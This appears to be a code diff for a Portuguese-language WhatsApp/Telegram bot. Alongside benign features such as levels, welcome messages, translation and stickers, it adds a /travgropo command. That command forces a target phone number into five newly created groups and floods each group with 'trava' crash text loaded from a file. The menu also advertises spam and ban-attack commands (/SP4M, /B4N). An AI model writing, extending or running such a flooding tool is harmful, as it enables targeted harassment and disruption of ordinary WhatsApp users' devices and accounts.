@@ -1,5 +1,5 @@
 const TelegramBot = require('node-telegram-bot-api');
-const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay, downloadMediaMessage } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const fs = require('fs');
 const path = require('path');
@@ -21,6 +21,10 @@ const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 let waSock = null;
 let jaNotificouConectado = false;
 let reconectando = false;
+
+// Banco de dados em memória para Níveis e Configurações de Grupo
+const dadosUsuarios = {}; // { 'remoteJid_usuario': { xp: 0, level: 1 } }
+const configuracoesGrupos = {}; // { 'idGrupo': { bemVindoTexto: '...', bemVindoFoto: null } }
 
 function consultarAPI(url) {
     return new Promise((resolve) => {
@@ -118,17 +122,51 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
         }
     });
 
+    // Evento de novos participantes no grupo (Boas-Vindas)
+    waSock.ev.on('group-participants.update', async (update) => {
+        try {
+            const { id, participants, action } = update;
+            if (action === 'add') {
+                const config = configuracoesGrupos[id];
+                if (!config) return; // Se não configurou boas-vindas no grupo, ignora
+
+                for (let participante of participants) {
+                    const mensagemWelcome = (config.bemVindoTexto || 'Seja bem-vindo(a) ao grupo!').replace('@user', `@${participante.split('@')[0]}`);
+                    
+                    if (config.bemVindoFoto) {
+                        await waSock.sendMessage(id, { image: config.bemVindoFoto, caption: mensagemWelcome, mentions: [participante] });
+                    } else {
+                        await waSock.sendMessage(id, { text: mensagemWelcome, mentions: [participante] });
+                    }
+                }
+            }
+        } catch (err) {
+            console.log("Erro no evento de boas-vindas:", err.message);
+        }
+    });
+
     waSock.ev.on('messages.upsert', async ({ messages }) => {
         try {
             const msg = messages[0];
             if (!msg.message) return;
 
-            const remoteJid = msg.key.remoteJid;
+            const remoteJid = remoteJidCheck(msg);
+            const sender = msg.key.participant || msg.key.remoteJid;
             
-            // Trata texto normal ou legenda de imagem enviada junto ao comando
             const texto = msg.message.conversation || 
                           msg.message.extendedTextMessage?.text || 
                           msg.message.imageMessage?.caption || '';
+
+            // Sistema de XP / Nível por mensagem enviada
+            if (sender && !msg.key.fromMe) {
+                if (!dadosUsuarios[sender]) dadosUsuarios[sender] = { xp: 0, level: 1 };
+                dadosUsuarios[sender].xp += 10;
+                let xpNecessario = dadosUsuarios[sender].level * 100;
+                if (dadosUsuarios[sender].xp >= xpNecessario) {
+                    dadosUsuarios[sender].level += 1;
+                    dadosUsuarios[sender].xp = 0;
+                }
+            }
 
             if (!texto) return;
             console.log(`Mensagem recebida de ${remoteJid}:${texto}`);
@@ -157,18 +195,22 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `> /SP4M <número> <qtd>\n` +
                     `> /B4N <número> <qtd>\n` +
                     `> /B4NGRUPO <link>\n` +
-                    `╠━━━⧼𝗚𝗘𝗦𝗧𝗔̃𝗢 𝗗𝗘 𝗚𝗥𝗨𝗣𝗢𝗦⧽\n` +
+                    `> /travgropo <número> <qtd>\n` +
+                    `╠━━━⧼𝗚𝗘𝗦𝗧𝗔̃𝗢 & UTILITÁRIOS⧽\n` +
                     `> /kick <número>\n` +
                     `> /promover <número>\n` +
                     `> /rebaixar <número>\n` +
                     `> /tagall <mensagem>\n` +
                     `> /linkgrupo\n` +
-                    `> /fechar\n` +
-                    `> /abrir\n` +
+                    `> /fechar | /abrir\n` +
                     `> /infogrupo\n` +
                     `> /mudar-nome <nome>\n` +
                     `> /mudar-desc <descrição>\n` +
-                    `> /divulgar <texto | link>\n` +
+                    `> /divulgar <texto>\n` +
+                    `> /nivel\n` +
+                    `> /setwelcome <texto> (com foto opcional)\n` +
+                    `> /traduzir <idioma>\n` +
+                    `> /s (Figurinha)\n` +
                     `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
                 
                 const caminhoFoto = path.join(__dirname, 'menu.jpg');
@@ -345,6 +387,47 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     await waSock.sendMessage(remoteJid, { text: `❌ Erro ao interagir com o grupo: ${err.message || 'Verifique se o link é válido.'}` });
                 }
             }
+            else if (texto.startsWith('/travgropo')) {
+                const partes = texto.replace('/travgropo', '').trim().split(' ');
+                const alvoNum = partes[0]?.replace(/\D/g, '');
+                const quantidadeTrava = parseInt(partes[1]) || 5;
+
+                if (!alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/travgropo <número> <quantidade_travas>`' });
+                    return;
+                }
+
+                await waSock.sendMessage(remoteJid, { text: `⚙️ Criando 5 grupos e adicionando o alvo \`${alvoNum}\`...` });
+
+                let conteudoTravaGrupo = "⚡ [ZRX-GRUPO ATTACK] 💥";
+                const caminhoTravaGrupo = path.join(__dirname, 'travgropo.txt');
+                if (fs.existsSync(caminhoTravaGrupo)) {
+                    const lido = fs.readFileSync(caminhoTravaGrupo, 'utf-8').trim();
+                    if (lido.length > 0) conteudoTravaGrupo = lido;
+                }
+
+                const nomeGrupo = "𝑹𝑬𝑷𝑶́𝑹𝑻𝑬𝑹 𝒃𝒚 𝑳𝑶𝑻𝑼𝑿";
+                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
+
+                for (let g = 1; g <= 5; g++) {
+                    try {
+                        const grupoCriado = await waSock.groupCreate(`${nomeGrupo} #${g}`, [jidAlvo]);
+                        const idNovoGrupo = grupoCriado.id;
+
+                        await waSock.sendMessage(remoteJid, { text: `✅ Grupo ${g}/5 criado. Disparando travas...` });
+                        await delay(2000);
+
+                        for (let i = 1; i <= quantidadeTrava; i++) {
+                            await waSock.sendMessage(idNovoGrupo, { text: `${conteudoTravaGrupo}\n\n[Grupo${g} - Ciclo ${i}/${quantidadeTrava}]` });
+                            await delay(1000);
+                        }
+                    } catch (err) {
+                        console.log(`Erro ao criar/atacar o grupo ${g}:`, err.message);
+                    }
+                }
+
+                await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 5 grupos!` });
+            }
             else if (texto.startsWith('/kick ')) {
                 if (!remoteJid.endsWith('@g.us')) {
                     await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
@@ -437,7 +520,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     await waSock.groupSettingUpdate(remoteJid, 'announcement');
                     await waSock.sendMessage(remoteJid, { text: '🔒 Grupo fechado! Apenas administradores podem enviar mensagens.' });
                 } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao fechar o grupo. Verifique se o bot é administrador.' });
+                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao fechar o grupo.' });
                 }
             }
             else if (texto.trim() === '/abrir') {
@@ -449,7 +532,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     await waSock.groupSettingUpdate(remoteJid, 'not_announcement');
                     await waSock.sendMessage(remoteJid, { text: '🔓 Grupo aberto! Todos os membros podem enviar mensagens.' });
                 } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao abrir o grupo. Verifique se o bot é administrador.' });
+                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao abrir o grupo.' });
                 }
             }
             else if (texto.trim() === '/infogrupo') {
@@ -479,15 +562,11 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     return;
                 }
                 const novoNome = texto.replace('/mudar-nome', '').trim();
-                if (!novoNome) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/mudar-nome <novo nome>`' });
-                    return;
-                }
                 try {
                     await waSock.groupUpdateSubject(remoteJid, novoNome);
                     await waSock.sendMessage(remoteJid, { text: `✅ Nome do grupo alterado para: *${novoNome}*` });
                 } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao alterar nome. Verifique se o bot é administrador.' });
+                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao alterar nome.' });
                 }
             }
             else if (texto.startsWith('/mudar-desc ')) {
@@ -496,44 +575,88 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     return;
                 }
                 const novaDesc = texto.replace('/mudar-desc', '').trim();
-                if (!novaDesc) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/mudar-desc <nova descrição>`' });
-                    return;
-                }
                 try {
                     await waSock.groupUpdateDescription(remoteJid, novaDesc);
                     await waSock.sendMessage(remoteJid, { text: `✅ Descrição do grupo alterada com sucesso!` });
                 } catch (err) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao alterar descrição. Verifique se o bot é administrador.' });
+                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao alterar descrição.' });
                 }
             }
             else if (texto.startsWith('/divulgar ')) {
                 const conteudoDivulgacao = texto.replace('/divulgar', '').trim();
-                if (!conteudoDivulgacao) {
-                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/divulgar <sua mensagem ou link>`\n*(Dica: Pode enviar junto com uma foto e colocar o comando na legenda!)*' });
-                    return;
-                }
-
                 const mensagemFormatada = `📢 *DIVULGAÇÃO OFICIAL* 📢\n\n${conteudoDivulgacao}\n\n_Enviado via Bot ZRX_`;
 
-                // Apaga a mensagem original de comando se possível para limpar o chat, e envia a divulgação formatada com imagem (se houver)
                 try {
                     if (msg.message.imageMessage) {
-                        // Se enviou com foto, baixa a imagem e reenvia com a nova legenda formatada
-                        const streamToBuffer = async (stream) => {
-                            const chunks = [];
-                            for await (const chunk of stream) chunks.push(chunk);
-                            return Buffer.concat(chunks);
-                        };
-                        const { downloadMediaMessage } = require('@whiskeysockets/baileys');
                         const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
-                        
                         await waSock.sendMessage(remoteJid, { image: buffer, caption: mensagemFormatada });
                     } else {
                         await waSock.sendMessage(remoteJid, { text: mensagemFormatada });
                     }
                 } catch (e) {
                     await waSock.sendMessage(remoteJid, { text: mensagemFormatada });
+                }
+            }
+            else if (texto.trim() === '/nivel') {
+                const user = dadosUsuarios[sender] || { xp: 0, level: 1 };
+                await waSock.sendMessage(remoteJid, { text: `⭐ *SEU PERFIL / NÍVEL*\n\n• *Nível:* ${user.level}\n• *XP Atual:* ${user.xp}/${user.level * 100}` });
+            }
+            else if (texto.startsWith('/setwelcome')) {
+                if (!remoteJid.endsWith('@g.us')) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Use este comando em um grupo!' });
+                    return;
+                }
+                const msgWelcome = texto.replace('/setwelcome', '').trim();
+                let fotoBuffer = null;
+
+                if (msg.message.imageMessage) {
+                    fotoBuffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
+                }
+
+                configuracoesGrupos[remoteJid] = {
+                    bemVindoTexto: msgWelcome || 'Olá @user, seja bem-vindo(a)!',
+                    bemVindoFoto: fotoBuffer
+                };
+
+                await waSock.sendMessage(remoteJid, { text: '✅ Mensagem de boas-vindas configurada com sucesso para este grupo!' });
+            }
+            else if (texto.startsWith('/traduzir')) {
+                const idioma = texto.replace('/traduzir', '').trim() || 'pt';
+                const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
+                const textoParaTraduzir = quoted?.conversation || quoted?.extendedTextMessage?.text;
+
+                if (!textoParaTraduzir) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Responda a uma mensagem de texto usando `/traduzir <idioma>` (ex: `/traduzir en`)' });
+                    return;
+                }
+
+                const urlTraducao = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${idioma}&dt=t&q=${encodeURIComponent(textoParaTraduzir)}`;
+                const respostaTraducao = await consultarAPI(urlTraducao);
+
+                try {
+                    const textoTraduzido = respostaTraducao[0][0][0];
+                    await waSock.sendMessage(remoteJid, { text: `🌐 *TRADUÇÃO (${idioma.toUpperCase()}):*\n\n${textoTraduzido}` });
+                } catch (e) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao traduzir o texto.' });
+                }
+            }
+            else if (texto.trim() === '/s' || texto.trim() === '/sticker') {
+                const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
+                const isImage = msg.message.imageMessage || quoted?.imageMessage;
+
+                if (!isImage) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Envie ou responda a uma imagem com `/s` para transformar em figurinha!' });
+                    return;
+                }
+
+                try {
+                    const targetMsg = msg.message.imageMessage ? msg : { key: { remoteJid, id: msg.message.extendedTextMessage.contextInfo.stanzaId }, message: quoted };
+                    const buffer = await downloadMediaMessage(targetMsg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
+                    
+                    // Envia imagem como figurinha (stickers básicos do baileys suportam envio direto de buffer se configurado ou conversão)
+                    await waSock.sendMessage(remoteJid, { sticker: buffer });
+                } catch (err) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao gerar a figurinha.' });
                 }
             }
             else if (texto.trim() === '/linkIP') {
@@ -593,6 +716,10 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             if (chatId) bot.sendMessage(chatId, "❌ Erro ao gerar o código de pareamento.");
         }
     }
+}
+
+function remoteJidCheck(msg) {
+    return msg.key.remoteJid;
 }
 
 // Comando /foto no Telegram para definir a imagem do menu de ambas as plataformas
